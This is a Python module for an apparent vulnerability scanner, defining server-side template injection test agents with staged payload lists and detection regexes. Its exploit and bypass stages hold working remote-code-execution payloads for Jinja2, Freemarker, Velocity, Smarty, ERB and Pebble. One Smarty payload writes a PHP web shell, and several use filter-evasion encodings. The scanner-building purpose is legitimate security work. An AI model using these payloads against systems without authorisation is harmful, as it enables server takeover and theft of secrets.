"""Server-Side Template Injection (SSTI) Agent - CWE-1336."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class SSTIAgent(BaseAgent):
    """
    Server-Side Template Injection (SSTI) testing agent.

    Tests for SSTI vulnerabilities in various template engines:
    - Jinja2 (Python)
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - ERB (Ruby)
    - Pebble (Java)

    Payloads derived from ZAP's SstiScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "ssti"

    @property
    def cweid(self) -> int:
        return 1336  # Improper Neutralization of Special Elements in Template Engine

    @property
    def priority(self) -> int:
        return 9  # High priority - can lead to RCE

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Math expression probes (engine agnostic)
                "{{7*7}}",          # Jinja2, Twig
                "${7*7}",           # Freemarker, Velocity
                "#{7*7}",           # Ruby ERB, Java EL
                "<%= 7*7 %>",       # ERB
                "{7*7}",            # Smarty
                "{{= 7*7 }}",       # Handlebars
                "*{7*7}",           # Thymeleaf
                # String probes
                "{{\"ssti\"}}",
                "${\"ssti\"}",
                "#{\"ssti\"}",
            ],
            PayloadStage.CONFIRM: [
                # More specific probes
                "{{7*'7'}}",        # Jinja2 returns '7777777'
                "${7*'7'}",         # Freemarker returns '7777777'
                "{{config}}",       # Jinja2 config access
                "{{settings}}",     # Django template
                # Class access probes
                "{{''.__class__}}",
                "${class.class}",
                "#{T(java.lang.Runtime)}",
            ],
            PayloadStage.EXPLOIT: [
                # Jinja2 RCE
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                # Twig RCE
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                # Freemarker RCE
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                # Velocity RCE
                "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))",
                # Smarty RCE
                "{php}echo `id`;{/php}",
                "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
                # ERB RCE
                "<%= `id` %>",
                "<%= system('id') %>",
                # Pebble RCE
                "{% set cmd = 'id' %}{{ beans.get('Runtime').getRuntime().exec(cmd) }}",
            ],
            PayloadStage.BYPASS: [
                # Filter bypasses
                "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
                "{{request['__class__']['__mro__'][1]['__subclasses__']()}}",
                # Encoding
                "{{''[\"\\x5f\\x5fclass\\x5f\\x5f\"]}}",
                "${T(java.lang.Ru\\u006e\\u0074ime)}",
                # Alternative syntax
                "{%%set x=7*7%%}{{x}}",
                "{% set x = 7*7 %}{{ x }}",
                # Sandbox escape
                "{{joiner.__init__.__globals__.os.popen('id').read()}}",
                "{{namespace.__init__.__globals__.os.popen('id').read()}}",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate SSTI vulnerability."""
        patterns = [
            # Math expression results
            r"\b49\b",              # 7*7 = 49
            r"7777777",             # 7*'7' in some engines
            # Error messages
            r"TemplateSyntaxError",
            r"UndefinedError",
            r"jinja2\.exceptions",
            r"Twig.*Error",
            r"freemarker\.core",
            r"freemarker\.template",
            r"VelocityException",
            r"ParseErrorException",
            r"org\.apache\.velocity",
            r"SmartyException",
            r"ERB::Error",
            r"syntax error.*erb",
            # Class/object access indicators
            r"<class\s+'",
            r"\[<class",
            r"__class__",
            r"__mro__",
            r"__subclasses__",
            r"__globals__",
            # Config/settings access
            r"<Config\s+",
            r"SECRET_KEY",
            r"DATABASE_URL",
            # Command output
            r"uid=\d+",
            r"root:.*:0:0:",
            # Java class names
            r"java\.lang\.Runtime",
            r"java\.lang\.ProcessBuilder",
            # Generic template errors
            r"template.*error",
            r"syntax.*template",
            r"render.*failed",
        ]
        return [re.compile(p, re.IGNORECASE) for p in patterns]


class SSTIJinja2Agent(SSTIAgent):
    """Specialized agent for Jinja2 SSTI."""

    @property
    def vulnerability_type(self) -> str:
        return "ssti_jinja2"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
            ],
            PayloadStage.CONFIRM: [
                "{{''.__class__}}",
                "{{''.__class__.__mro__}}",
                "{{request}}",
                "{{self}}",
            ],
            PayloadStage.EXPLOIT: [
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            ],
            PayloadStage.BYPASS: [
                "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
                "{{''.\\x5f\\x5fclass\\x5f\\x5f}}",
                "{% set x = config.items() %}{{x}}",
            ],
        }


class SSTIFreemarkerAgent(SSTIAgent):
    """Specialized agent for Freemarker SSTI."""

    @property
    def vulnerability_type(self) -> str:
        return "ssti_freemarker"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                "${7*7}",
                "${\"test\"}",
                "<#assign x=7*7>${x}",
            ],
            PayloadStage.CONFIRM: [
                "${class}",
                "${.data_model}",
                "${.globals}",
            ],
            PayloadStage.EXPLOIT: [
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"id\").start()}",
            ],
            PayloadStage.BYPASS: [
                "${\"\u0066reemarker.template.utility.Execute\"?new()(\"id\")}",
            ],
        }
